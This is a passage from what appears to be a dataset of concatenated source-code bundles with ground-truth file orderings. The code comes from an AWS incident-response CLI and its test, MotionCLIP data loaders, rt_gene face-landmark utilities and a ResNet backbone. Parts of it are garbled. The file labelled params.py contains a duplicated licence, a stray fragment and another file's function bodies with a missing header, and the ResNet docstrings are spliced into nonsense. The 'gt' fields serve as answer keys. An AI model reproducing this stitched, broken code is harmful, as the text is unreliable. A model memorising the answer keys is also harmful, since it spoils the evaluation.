        case_obj.prep_aws_connections()\n                logger.info(\n                    'Alert : multi-host mode engaged targets in file will attempt processing.'\n                )\n                batch_file = os.path.abspath(self.config.targets)\n\n                with open(batch_file) as f:\n                    targets = f.read().split('\\n')\n\n                for target in targets:\n                    if target != '':\n                        hc = host.Compromise(\n                            user=self.config.user,\n                            ssh_key_file=self.config.ssh_key,\n                            target=target,\n                            prog=self.prog,\n                            case=case_obj,\n                            steps=self.config.plugins\n                        )\n                        try:\n                            logger.info(\"Attempting processing instance {i}\".format(i=target))\n                            hc.mitigate()\n                        except KeyboardInterrupt:\n                            pass\n        elif self.config.func == 'key_compromise':\n            kc = key.Compromise(\n                examiner_cidr_range=self.config.examiner_cidr_range,\n                compromised_access_key_id=self.config.access_key_id,\n                region='us-west-2',\n                case=case_obj,\n                steps=self.config.plugins\n            )\n\n            try:\n                kc.mitigate()\n            except KeyboardInterrupt:\n                pass\n\n\nif __name__ == '__main__':\n    c = cli()\n    if c.prog is not None:\n        c.run()\n\n'aws_ir/tests/test_cli.py'\n:import copy\nimport pytest\n\nfrom aws_ir.cli import cli\n\n\n@pytest.fixture\ndef cli_object():\n    cli_object = cli()\n    return cli_object\n\n\ndef test_parse_args():\n    cli = cli_object()\n    case_number = \"cr-17-000001-2d2d\"\n    cidr_range = \"0.0.0.0/0\"\n    bucket_name = \"crn-00001-assets\"\n    profile = \"default\"\n\n    optional_args = [\"--profile\", profile,\n                     \"--case-number\", case_number,\n                     \"--examiner-cidr-range\", cidr_range,\n                     \"--bucket-name\", bucket_name, \"--dry-run\"]\n    instance_ip = \"172.16.20.1\"\n    user = \"ec2-user\"\n    ssh_key = \"ssh.key\"\n    instance_compromise_args = [\n        \"instance-compromise\",\n        \"--target\",\n        instance_ip,\n        \"--user\",\n        user,\n        \"--ssh-key\",\n        ssh_key\n    ]\n    access_key_id = \"AKIAIOSFODNN7EXAMPLE\"\n    key_compromise_args = [\"key-compromise\", \"--access-key-id\",\n                           access_key_id]\n\n    instance_args = copy.copy(optional_args)\n    key_args = copy.copy(optional_args)\n\n    instance_args.extend(instance_compromise_args)\n    parsed_instance_args = cli.parse_args(instance_args)\n\n    key_args.extend(key_compromise_args)\n    parsed_key_args = cli.parse_args(key_args)\n\n\n    assert parsed_instance_args.case_number == case_number\n    assert parsed_instance_args.examiner_cidr_range == cidr_range\n    assert parsed_instance_args.bucket_name == bucket_name\n    assert parsed_instance_args.dry_run is True\n\n    assert parsed_instance_args.target == instance_ip\n    assert parsed_instance_args.user == user\n    assert parsed_instance_args.ssh_key == ssh_key\n\n    with pytest.raises(AttributeError):\n        assert parsed_instance_args.access_key_id == access_key_id\n\n    assert parsed_instance_args.func == \"instance_compromise\"\n\n\n    assert parsed_key_args.case_number == case_number\n    assert parsed_key_args.examiner_cidr_range == cidr_range\n    assert parsed_key_args.bucket_name == bucket_name\n    assert parsed_key_args.dry_run is True\n\n    assert parsed_key_args.access_key_id == access_key_id\n\n    with pytest.raises(AttributeError):\n        assert parsed_key_args.instance_ip == instance_ip\n    with pytest.raises(AttributeError):\n        assert parsed_key_args.user == user\n    with pytest.raises(AttributeError):\n        assert parsed_key_args.ssh_key == ssh_key\n\n    assert parsed_key_args.func == \"key_compromise\"\n\n\ndef teardown_module():\n    pass\n",
        "gt": [
            "'aws_ir/aws_ir/libs/case.py'",
            "'aws_ir/aws_ir/cli.py'",
            "'aws_ir/tests/test_cli.py'"
        ]
    },
    {
        "files": [
            "'MotionCLIP/src/datasets/amass.py'",
            "'MotionCLIP/src/datasets/get_dataset.py'",
            "'MotionCLIP/src/config.py'"
        ],
        "content": "'MotionCLIP/src/datasets/amass.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport os\nimport numpy as np\nimport joblib\nfrom .dataset import Dataset\nfrom src.config import ROT_CONVENTION_TO_ROT_NUMBER\nfrom src import config\nfrom PIL import Image\nimport sys\n\nsys.path.append('')\n\n\n\naction2motion_joints = [8, 1, 2, 3, 4, 5, 6, 7, 0, 9, 10, 11, 12, 13, 14, 21, 24, 38]\n\nfrom src.utils.action_label_to_idx import action_label_to_idx, idx_to_action_label\n\n\ndef get_z(cam_s, cam_pos, joints, img_size, flength):\n\n\n    joints_orth_target = (cam_s * (joints[:, :2] + cam_pos) + 1) * 0.5 * img_size\n    height3d = np.linalg.norm(np.max(joints[:, :2], axis=0) - np.min(joints[:, :2], axis=0))\n    height2d = np.linalg.norm(np.max(joints_orth_target, axis=0) - np.min(joints_orth_target, axis=0))\n    tz = np.array(flength * (height3d / height2d))\n    return float(tz)\n\n\ndef get_trans_from_vibe(vibe, use_z=True):\n    alltrans = []\n    for t in range(vibe[\"joints3d\"].shape[0]):\n\n\n\n\n        cam_orig = vibe[\"orig_cam\"][t]\n        x = cam_orig[2]\n        y = cam_orig[3]\n        if use_z:\n            z = get_z(cam_s=cam_orig[0],\n                      cam_pos=cam_orig[2:4],\n                      joints=vibe['joints3d'][t],\n                      img_size=480,\n                      flength=500)\n\n        else:\n            z = 0\n        trans = [x, y, z]\n        alltrans.append(trans)\n    alltrans = np.array(alltrans)\n    return alltrans - alltrans[0]\n\n\nclass AMASS(Dataset):\n    dataname = \"amass\"\n\n    def __init__(self, datapath=\"data/amass/amass_30fps_legacy_db.pt\", split=\"train\", use_z=1, **kwargs):\n        assert '_db.pt' in datapath\n        self.datapath = datapath.replace('_db.pt', '_{}.pt'.format(split))\n        assert os.path.exists(self.datapath)\n        print('datapath used by amass is [{}]'.format(self.datapath))\n        super().__init__(**kwargs)\n\n        self.dataname = \"amass\"\n\n\n        self.rot_convention = 'legacy'\n        self.use_betas = False\n        self.use_gender = False\n        self.use_body_features = False\n        if 'clip_preprocess' in kwargs.keys():\n            self.clip_preprocess = kwargs['clip_preprocess']\n\n        self.use_z = (use_z != 0)\n\n\n        dummy_class = [0]\n        genders = config.GENDERS\n        self.num_classes = len(dummy_class)\n\n        self.db = self.load_db()\n        self._joints3d = []\n        self._poses = []\n        self._num_frames_in_video = []\n        self._actions = []\n        self._betas = []\n        self._genders = []\n        self._heights = []\n        self._masses = []\n        self._clip_images = []\n        self._clip_texts = []\n        self._clip_pathes = []\n        self._actions_cat = []\n        self.clip_label_text = \"text_raw_labels\"\n\n        seq_len = 100\n        n_sequences = len(self.db['thetas'])\n\n        for seq_idx in range(n_sequences):\n            n_sub_seq = self.db['thetas'][seq_idx].shape[0] // seq_len\n            if n_sub_seq == 0: continue\n            n_frames_in_use = n_sub_seq * seq_len\n            joints3d = np.split(self.db['joints3d'][seq_idx][:n_frames_in_use], n_sub_seq)\n            poses = np.split(self.db['thetas'][seq_idx][:n_frames_in_use], n_sub_seq)\n            self._joints3d.extend(joints3d)\n            self._poses.extend(poses)\n            self._num_frames_in_video.extend([seq_len] * n_sub_seq)\n\n            if 'action_cat' in self.db:\n                self._actions_cat.extend(np.split(self.db['action_cat'][seq_idx][:n_frames_in_use], n_sub_seq))\n\n            if self.use_betas:\n                self._betas.extend(np.split(self.db['betas'][seq_idx][:n_frames_in_use], n_sub_seq))\n            if self.use_gender:\n                self._genders.extend([str(self.db['genders'][seq_idx]).replace(\"b'female'\", \"female\").replace(\"b'male'\",\n                                                                                                              \"male\")] * n_sub_seq)\n            if self.use_body_features:\n                self._heights.extend([self.db['heights'][seq_idx]] * n_sub_seq)\n                self._masses.extend([self.db['masses'][seq_idx]] * n_sub_seq)\n            if 'clip_images' in self.db.keys():\n                images = [np.squeeze(e) for e in np.split(self.db['clip_images'][seq_idx][:n_sub_seq], n_sub_seq)]\n                processed_images = [self.clip_preprocess(Image.fromarray(img)) for img in images]\n                self._clip_images.extend(processed_images)\n            if self.clip_label_text in self.db:\n                self._clip_texts.extend(np.split(self.db[self.clip_label_text][seq_idx][:n_frames_in_use], n_sub_seq))\n            if 'clip_pathes' in self.db:\n                self._clip_pathes.extend(np.split(self.db['clip_pathes'][seq_idx][:n_sub_seq], n_sub_seq))\n            if 'clip_images_emb' in self.db.keys():\n                self._clip_images_emb.extend(np.split(self.db['clip_images_emb'][seq_idx][:n_sub_seq], n_sub_seq))\n\n\n\n            actions = [0] * n_sub_seq\n            self._actions.extend(actions)\n\n        assert len(self._num_frames_in_video) == len(self._poses) == len(self._joints3d) == len(self._actions)\n        if self.use_betas:\n            assert len(self._poses) == len(self._betas)\n        if self.use_gender:\n            assert len(self._poses) == len(self._genders)\n        if 'clip_images' in self.db.keys():\n            assert len(self._poses) == len(self._clip_images)\n\n        self._actions = np.array(self._actions)\n        self._num_frames_in_video = np.array(self._num_frames_in_video)\n\n        N = len(self._poses)\n\n        self._train = np.arange(N)\n        self._test = np.arange(N)\n\n        self._action_to_label = {x: i for i, x in enumerate(dummy_class)}\n        self._label_to_action = {i: x for i, x in enumerate(dummy_class)}\n\n        self._gender_to_label = {x: i for i, x in enumerate(genders)}\n        self._label_to_gender = {i: x for i, x in enumerate(genders)}\n\n        self._action_classes = idx_to_action_label\n\n    def load_db(self):\n\n\n\n\n\n\n\n        db_file = self.datapath\n        db = joblib.load(db_file)\n\n        if 'clip_images' in db and db['clip_images'][0] is None:\n            del db['clip_images']\n\n        return db\n\n    def _load_joints3D(self, ind, frame_ix):\n        joints3D = self._joints3d[ind][frame_ix]\n        return joints3D\n\n    def _load_rotvec(self, ind, frame_ix):\n        pose = self._poses[ind][frame_ix, :].reshape(-1, ROT_CONVENTION_TO_ROT_NUMBER[self.rot_convention] + 1,\n                                                     3)\n        return pose\n\n    def _load_betas(self, ind, frame_ix):\n        betas = self._betas[ind][frame_ix].transpose((1, 0))\n        return betas\n\n    def _load_gender(self, ind, frame_ix):\n        gender = self._gender_to_label[self._genders[ind]]\n        return gender\n\n    def _load_body_features(self, ind, frame_ix):\n        return {'mass': float(self._masses[ind]), 'height': float(self._heights[ind])}\n\n\nif __name__ == \"__main__\":\n    dataset = AMASS()\n\n'MotionCLIP/src/datasets/get_dataset.py'\n:from .amass import AMASS\n\ndef get_dataset(name=\"amass\"):\n    return AMASS\n\n\ndef get_datasets(parameters, clip_preprocess, split=\"train\"):\n    DATA = AMASS\n\n    if split == 'all':\n        train = DATA(split='train', clip_preprocess=clip_preprocess, **parameters)\n        test = DATA(split='vald', clip_preprocess=clip_preprocess, **parameters)\n\n\n        train.update_parameters(parameters)\n        test.update_parameters(parameters)\n    else:\n        dataset = DATA(split=split, clip_preprocess=clip_preprocess, **parameters)\n        train = dataset\n\n\n        from copy import copy\n        test = copy(train)\n        test.split = test\n\n\n        dataset.update_parameters(parameters)\n\n    datasets = {\"train\": train,\n                \"test\": test}\n\n    return datasets\n\n'MotionCLIP/src/config.py'\n:import os\n\nSMPL_DATA_PATH = \"./models/smpl\"\nSMPL_KINTREE_PATH = os.path.join(SMPL_DATA_PATH, \"kintree_table.pkl\")\nSMPL_MODEL_PATH = os.path.join(SMPL_DATA_PATH, \"SMPL_NEUTRAL.pkl\")\nJOINT_REGRESSOR_TRAIN_EXTRA = os.path.join(SMPL_DATA_PATH, 'J_regressor_extra.npy')\n\nSMPLH_AMASS_PATH = './models/smplh'\nSMPLH_AMASS_MODEL_PATH = os.path.join(SMPLH_AMASS_PATH, \"neutral/model.npz\")\nSMPLH_AMASS_MALE_MODEL_PATH = os.path.join(SMPLH_AMASS_PATH, \"male/model.npz\")\nSMPLH_AMASS_FEMALE_MODEL_PATH = os.path.join(SMPLH_AMASS_PATH, \"female/model.npz\")\n\nSMPLX_DATA_PATH = \"models/smplx/\"\nSMPLX_MODEL_PATH = os.path.join(SMPLX_DATA_PATH, \"SMPLX_NEUTRAL.pkl\")\nSMPLX_MALE_MODEL_PATH = os.path.join(SMPLX_DATA_PATH, \"SMPLX_MALE.pkl\")\nSMPLX_FEMALE_MODEL_PATH = os.path.join(SMPLX_DATA_PATH, \"SMPLX_FEMALE.pkl\")\n\nJOINT_REGRESSOR_TRAIN_EXTRA = os.path.join(SMPL_DATA_PATH, 'J_regressor_extra.npy')\n\nJOINT_REGRESSOR_TRAIN_EXTRA = os.path.join(SMPL_DATA_PATH, 'J_regressor_extra.npy')\n\nROT_CONVENTION_TO_ROT_NUMBER = {\n    'legacy': 23,\n    'no_hands': 21,\n    'full_hands': 51,\n    'mitten_hands': 33,\n}\n\nGENDERS = ['neutral', 'male', 'female']\nNUM_BETAS = 10\n",
        "gt": [
            "'MotionCLIP/src/config.py'",
            "'MotionCLIP/src/datasets/amass.py'",
            "'MotionCLIP/src/datasets/get_dataset.py'"
        ]
    },
    {
        "files": [
            "'rt_gene/rt_gene_model_training/pytorch/utils/GenerateEyePatchesRTGENEDataset.py'",
            "'rt_gene/rt_gene/src/rt_gene/extract_landmarks_method_base.py'",
            "'rt_gene/rt_gene/src/rt_gene/ThreeDDFA/params.py'",
            "'rt_gene/rt_gene/src/rt_gene/ThreeDDFA/inference.py'"
        ],
        "content": "'rt_gene/rt_gene_model_training/pytorch/utils/GenerateEyePatchesRTGENEDataset.py'\n:from __future__ import print_function, division, absolute_import\n\nimport argparse\nimport os\n\nimport cv2\nfrom tqdm import tqdm\n\nfrom rt_gene.extract_landmarks_method_base import LandmarkMethodBase\n\nscript_path = os.path.dirname(os.path.realpath(__file__))\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description='Estimate gaze from images')\n    parser.add_argument('im_path', type=str, default=os.path.join(script_path, '../samples/natural'),\n                        nargs='?', help='Path to an image or a directory containing images')\n    parser.add_argument('--output_path', type=str, default=os.path.join(script_path, '../samples/'), help='Output directory for left/right eye patches')\n\n    landmark_estimator = LandmarkMethodBase(device_id_facedetection=\"cuda:0\",\n                                            checkpoint_path_face=os.path.join(script_path, \"../../rt_gene/model_nets/SFD/s3fd_facedetector.pth\"),\n                                            checkpoint_path_landmark=os.path.join(script_path, \"../../rt_gene/model_nets/phase1_wpdc_vdc.pth.tar\"),\n                                            model_points_file=os.path.join(script_path, \"../../rt_gene/model_nets/face_model_68.txt\"))\n\n    args = parser.parse_args()\n\n    image_path_list = []\n    if os.path.isfile(args.im_path):\n        image_path_list.append(os.path.split(args.im_path)[1])\n        args.im_path = os.path.split(args.im_path)[0]\n    elif os.path.isdir(args.im_path):\n        for image_file_name in os.listdir(args.im_path):\n            if image_file_name.endswith('.jpg') or image_file_name.endswith('.png'):\n                if '_gaze' not in image_file_name and '_headpose' not in image_file_name:\n                    image_path_list.append(image_file_name)\n\n    left_folder_path = os.path.join(args.output_path, \"left_new\")\n    right_folder_path = os.path.join(args.output_path, \"right_new\")\n    if not os.path.isdir(left_folder_path):\n        os.makedirs(left_folder_path)\n    if not os.path.isdir(right_folder_path):\n        os.makedirs(right_folder_path)\n\n    p_bar = tqdm(image_path_list)\n    for image_file_name in p_bar:\n        p_bar.set_description(\"Processing {}\".format(image_file_name))\n        image = cv2.imread(os.path.join(args.im_path, image_file_name))\n        if image is None:\n            continue\n\n        faceboxes = landmark_estimator.get_face_bb(image)\n        if len(faceboxes) == 0:\n            continue\n\n        subjects = landmark_estimator.get_subjects_from_faceboxes(image, faceboxes)\n        for subject in subjects:\n            le_c, re_c, _, _ = subject.get_eye_image_from_landmarks(subject, landmark_estimator.eye_image_size)\n\n            if le_c is not None and re_c is not None:\n                img_name = image_file_name.split(\".\")[0]\n                left_image_path = [\"left\", img_name, \"rgb.png\"]\n                left_image_path = os.path.join(left_folder_path, \"_\".join(left_image_path))\n\n                right_image_path = [\"right\", img_name, \"rgb.png\"]\n                right_image_path = os.path.join(right_folder_path, \"_\".join(right_image_path))\n\n                cv2.imwrite(left_image_path, le_c)\n                cv2.imwrite(right_image_path, re_c)\n\n'rt_gene/rt_gene/src/rt_gene/extract_landmarks_method_base.py'\n:\n\nimport cv2\nimport numpy as np\nimport torch\nimport torchvision.transforms as transforms\nfrom torch.backends import cudnn as cudnn\nfrom tqdm import tqdm\n\nfrom rt_gene.download_tools import download_external_landmark_models\n\n\nfrom rt_gene import gaze_tools as gaze_tools\nfrom rt_gene.SFD.sfd_detector import SFDDetector\nfrom rt_gene.ThreeDDFA.ddfa import ToTensorGjz, NormalizeGjz\nfrom rt_gene.ThreeDDFA.inference import crop_img, predict_68pts, parse_roi_box_from_bbox, parse_roi_box_from_landmark\nfrom rt_gene.tracker_generic import TrackedSubject\n\nfacial_landmark_transform = transforms.Compose([ToTensorGjz(), NormalizeGjz(mean=127.5, std=128)])\n\n\nclass LandmarkMethodBase(object):\n    def __init__(self, device_id_facedetection, checkpoint_path_face=None, checkpoint_path_landmark=None, model_points_file=None):\n        download_external_landmark_models()\n        self.model_size_rescale = 16.0\n        self.head_pitch = 0.0\n        self.interpupillary_distance = 0.058\n        self.eye_image_size = (60, 36)\n\n        tqdm.write(\"Using device {} for face detection.\".format(device_id_facedetection))\n\n        self.device = device_id_facedetection\n        self.face_net = SFDDetector(device=device_id_facedetection, path_to_detector=checkpoint_path_face)\n        self.facial_landmark_nn = self.load_face_landmark_model(checkpoint_path_landmark)\n\n        self.model_points = self.get_full_model_points(model_points_file)\n\n    def load_face_landmark_model(self, checkpoint_fp=None):\n        import rt_gene.ThreeDDFA.mobilenet_v1 as mobilenet_v1\n        if checkpoint_fp is None:\n            import rospkg\n            checkpoint_fp = rospkg.RosPack().get_path('rt_gene') + '/model_nets/phase1_wpdc_vdc.pth.tar'\n        arch = 'mobilenet_1'\n\n        checkpoint = torch.load(checkpoint_fp, map_location=lambda storage, loc: storage)['state_dict']\n        model = getattr(mobilenet_v1, arch)(num_classes=62)\n\n        model_dict = model.state_dict()\n\n        for k in checkpoint.keys():\n            model_dict[k.replace('module.', '')] = checkpoint[k]\n        model.load_state_dict(model_dict)\n        cudnn.benchmark = True\n        model = model.to(self.device)\n        model.eval()\n        return model\n\n    def get_full_model_points(self, model_points_file=None):\n\n        raw_value = []\n        if model_points_file is None:\n            import rospkg\n            model_points_file = rospkg.RosPack().get_path('rt_gene') + '/model_nets/face_model_68.txt'\n\n        with open(model_points_file) as f:\n            for line in f:\n                raw_value.append(line)\n        model_points = np.array(raw_value, dtype=float)\n        model_points = np.reshape(model_points, (3, -1)).T\n\n\n        model_points = model_points * (self.interpupillary_distance * self.model_size_rescale)\n\n        return model_points\n\n    def get_face_bb(self, image):\n        faceboxes = []\n        fraction = 4.0\n        image = cv2.resize(image, (0, 0), fx=1.0 / fraction, fy=1.0 / fraction)\n        detections = self.face_net.detect_from_image(image)\n\n        for result in detections:\n\n            box = result[:4]\n            confidence = result[4]\n\n            if gaze_tools.box_in_image(box, image) and confidence > 0.6:\n                box = [x * fraction for x in box]\n                diff_height_width = (box[3] - box[1]) - (box[2] - box[0])\n                offset_y = int(abs(diff_height_width / 2))\n                box_moved = gaze_tools.move_box(box, [0, offset_y])\n\n\n                facebox = gaze_tools.get_square_box(box_moved)\n                faceboxes.append(facebox)\n\n        return faceboxes\n\n    @staticmethod\n    def visualize_headpose_result(face_image, est_headpose):\n\n        output_image = np.copy(face_image)\n\n        center_x = output_image.shape[1] / 2\n        center_y = output_image.shape[0] / 2\n\n        endpoint_x, endpoint_y = gaze_tools.get_endpoint(est_headpose[1], est_headpose[0], center_x, center_y, 100)\n\n        cv2.line(output_image, (int(center_x), int(center_y)), (int(endpoint_x), int(endpoint_y)), (0, 0, 255), 3)\n        return output_image\n\n    def ddfa_forward_pass(self, color_img, roi_box_list):\n        img_step = [crop_img(color_img, roi_box) for roi_box in roi_box_list]\n        img_step = [cv2.resize(img, dsize=(120, 120), interpolation=cv2.INTER_LINEAR) for img in img_step]\n        _input = torch.cat([facial_landmark_transform(img).unsqueeze(0) for img in img_step], 0)\n        with torch.no_grad():\n            _input = _input.to(self.device)\n            param = self.facial_landmark_nn(_input).cpu().numpy().astype(float)\n\n        return [predict_68pts(p.flatten(), roi_box) for p, roi_box in zip(param, roi_box_list)]\n\n    def get_subjects_from_faceboxes(self, color_img, faceboxes):\n        face_images = [gaze_tools.crop_face_from_image(color_img, b) for b in faceboxes]\n        subjects = []\n        roi_box_list = [parse_roi_box_from_bbox(facebox) for facebox in faceboxes]\n        initial_pts68_list = self.ddfa_forward_pass(color_img, roi_box_list)\n        roi_box_refined_list = [parse_roi_box_from_landmark(initial_pts68) for initial_pts68 in initial_pts68_list]\n        pts68_list = self.ddfa_forward_pass(color_img, roi_box_refined_list)\n\n        for pts68, face_image, facebox in zip(pts68_list, face_images, faceboxes):\n            np_landmarks = np.array((pts68[0], pts68[1])).T\n            subjects.append(TrackedSubject(np.array(facebox), face_image, np_landmarks))\n        return subjects\n\n'rt_gene/rt_gene/src/rt_gene/ThreeDDFA/params.py'\n:\"\"\"\nMIT License\n\nCopyright (c) 2018 Jianzhu Guo\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\nMIT License\n\nCopyright (c) 2018 Jianzhu Guo\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\na.jpg -> jpgcalc roi box from landmark\"\"\"\n    bbox = [min(pts[0, :]), min(pts[1, :]), max(pts[0, :]), max(pts[1, :])]\n    center = [(bbox[0] + bbox[2]) / 2, (bbox[1] + bbox[3]) / 2]\n    radius = max(bbox[2] - bbox[0], bbox[3] - bbox[1]) / 2\n    bbox = [center[0] - radius, center[1] - radius, center[0] + radius, center[1] + radius]\n\n    llength = sqrt((bbox[2] - bbox[0]) ** 2 + (bbox[3] - bbox[1]) ** 2)\n    center_x = (bbox[2] + bbox[0]) / 2\n    center_y = (bbox[3] + bbox[1]) / 2\n\n    roi_box = [0.0] * 4\n    roi_box[0] = center_x - llength / 2\n    roi_box[1] = center_y - llength / 2\n    roi_box[2] = roi_box[0] + llength\n    roi_box[3] = roi_box[1] + llength\n\n    return roi_box\n\n\ndef parse_roi_box_from_bbox(bbox):\n    left, top, right, bottom = bbox\n    old_size = (right - left + bottom - top) / 2\n    center_x = right - (right - left) / 2.0\n    center_y = bottom - (bottom - top) / 2.0 + old_size * 0.14\n    size = int(old_size * 1.58)\n    roi_box = [0] * 4\n    roi_box[0] = center_x - size / 2\n    roi_box[1] = center_y - size / 2\n    roi_box[2] = roi_box[0] + size\n    roi_box[3] = roi_box[1] + size\n    return roi_box\n\n\ndef _predict_vertices(param, roi_bbox, dense):\n    from .params import std_size\n    vertex = reconstruct_vertex(param, dense=dense)\n    sx, sy, ex, ey = roi_bbox\n    scale_x = (ex - sx) / std_size\n    scale_y = (ey - sy) / std_size\n    vertex[0, :] = vertex[0, :] * scale_x + sx\n    vertex[1, :] = vertex[1, :] * scale_y + sy\n\n    s = (scale_x + scale_y) / 2\n    vertex[2, :] *= s\n\n    return vertex\n\n\ndef predict_68pts(param, roi_box):\n    return _predict_vertices(param, roi_box, dense=False)\n\n\ndef predict_dense(param, roi_box):\n    return _predict_vertices(param, roi_box, dense=True)\n",
        "gt": [
            "'rt_gene/rt_gene/src/rt_gene/ThreeDDFA/params.py'",
            "'rt_gene/rt_gene/src/rt_gene/ThreeDDFA/inference.py'",
            "'rt_gene/rt_gene/src/rt_gene/extract_landmarks_method_base.py'",
            "'rt_gene/rt_gene_model_training/pytorch/utils/GenerateEyePatchesRTGENEDataset.py'"
        ]
    },
    {
        "files": [
            "'controlvideo/annotator/uniformer/mmseg/models/backbones/resnet.py'",
            "'controlvideo/annotator/uniformer/mmseg/utils/collect_env.py'",
            "'controlvideo/annotator/uniformer/__init__.py'",
            "'controlvideo/annotator/uniformer/mmseg/utils/__init__.py'",
            "'controlvideo/annotator/util.py'",
            "'controlvideo/annotator/uniformer/mmseg/models/backbones/__init__.py'"
        ],
        "content": "'controlvideo/annotator/uniformer/mmseg/models/backbones/resnet.py'\n:import torch.nn as nn\nimport torch.utils.checkpoint as cp\nfrom annotator.uniformer.mmcv.cnn import (build_conv_layer, build_norm_layer, build_plugin_layer,\n                      constant_init, kaiming_init)\nfrom annotator.uniformer.mmcv.runner import load_checkpoint\nfrom annotator.uniformer.mmcv.utils.parrots_wrapper import _BatchNorm\n\nfrom annotator.uniformer.mmseg.utils import get_root_logger\nfrom ..builder import BACKBONES\nfrom ..utils import ResLayer\n\n\nclass BasicBlock(nn.Module):\n\n\n    expansion = 1\n\n    def __init__(self,\n                 inplanes,\n                 planes,\n                 stride=1,\n                 dilation=1,\n                 downsample=None,\n                 style='pytorch',\n                 with_cp=False,\n                 conv_cfg=None,\n                 norm_cfg=dict(type='BN'),\n                 dcn=None,\n                 plugins=None):\n        super(BasicBlock, self).__init__()\n        assert dcn is None, 'Not implemented yet.'\n        assert plugins is None, 'Not implemented yet.'\n\n        self.norm1_name, norm1 = build_norm_layer(norm_cfg, planes, postfix=1)\n        self.norm2_name, norm2 = build_norm_layer(norm_cfg, planes, postfix=2)\n\n        self.conv1 = build_conv_layer(\n            conv_cfg,\n            inplanes,\n            planes,\n            3,\n            stride=stride,\n            padding=dilation,\n            dilation=dilation,\n            bias=False)\n        self.add_module(self.norm1_name, norm1)\n        self.conv2 = build_conv_layer(\n            conv_cfg, planes, planes, 3, padding=1, bias=False)\n        self.add_module(self.norm2_name, norm2)\n\n        self.relu = nn.ReLU(inplace=True)\n        self.downsample = downsample\n        self.stride = stride\n        self.dilation = dilation\n        self.with_cp = with_cp\n\n    @property\n    def norm1(self):\n\n        return getattr(self, self.norm1_name)\n\n    @property\n    def norm2(self):\n\n        return getattr(self, self.norm2_name)\n\n    def forward(self, x):\n\n\n        def _inner_forward(x):\n            identity = x\n\n            out = self.conv1(x)\n            out = self.norm1(out)\n            out = self.relu(out)\n\n            out = self.conv2(out)\n            out = self.norm2(out)\n\n            if self.downsample is not None:\n                identity = self.downsample(x)\n\n            out += identity\n\n            return out\n\n        if self.with_cp and x.requires_grad:\n            out = cp.checkpoint(_inner_forward, x)\n        else:\n            out = _inner_forward(x)\n\n        out = self.relu(out)\n\n        return out\n\n\nclass Bottleneck(nn.Module):\n    \"\"\"Bottleneck block for ResNet.\n\n    If style is \"pytorch\", the stride-two layer is the 3x3 conv layer, if it is\n    \"caffe\", the stride-two layer is the first 1x1 conv layer.\n    make plugins for block.\n\n        Args:\n            in_channels (int): Input channels of plugin.\n            plugins (list[dict]): List of plugins cfg to build.\n\n        Returns:\n            list[str]: List of the names of plugin.\n        Forward function for plugins.nn.Module: normalization layer after the first convolution layernn.Module: normalization layer after the second convolution layernn.Module: normalization layer after the third convolution layerForward function.ResNet backbone.\n\n    Args:\n        depth (int): Depth of resnet, from {18, 34, 50, 101, 152}.\n        in_channels (int): Number of input image channels. Default\" 3.\n        stem_channels (int): Number of stem channels. Default: 64.\n        base_channels (int): Number of base channels of res layer. Default: 64.\n        num_stages (int): Resnet stages, normally 4.\n        strides (Sequence[int]): Strides of the first block of each stage.\n        dilations (Sequence[int]): Dilation of each stage.\n        out_indices (Sequence[int]): Output from which stages.\n        style (str): `pytorch` or `caffe`. If set to \"pytorch\", the stride-two\n            layer is the 3x3 conv layer, otherwise the stride-two layer is\n            the first 1x1 conv layer.\n        deep_stem (bool): Replace 7x7 conv in input stem with 3 3x3 conv\n        avg_down (bool): Use AvgPool instead of stride conv when\n            downsampling in the bottleneck.\n        frozen_stages (int): Stages to be frozen (stop grad and set eval mode).\n            -1 means not freezing any parameters.\n        norm_cfg (dict): Dictionary to construct and config norm layer.\n        norm_eval (bool): Whether to set norm layers to eval mode, namely,\n            freeze running stats (mean and var). Note: Effect on Batch Norm\n            and its variants only.\n        plugins (list[dict]): List of plugins for stages, each dict contains:\n\n            - cfg (dict, required): Cfg dict to build plugin.\n\n            - position (str, required): Position inside block to insert plugin,\n            options: 'after_conv1', 'after_conv2', 'after_conv3'.\n\n            - stages (tuple[bool], optional): Stages to apply plugin, length\n            should be same as 'num_stages'\n        multi_grid (Sequence[int]|None): Multi grid dilation rates of last\n            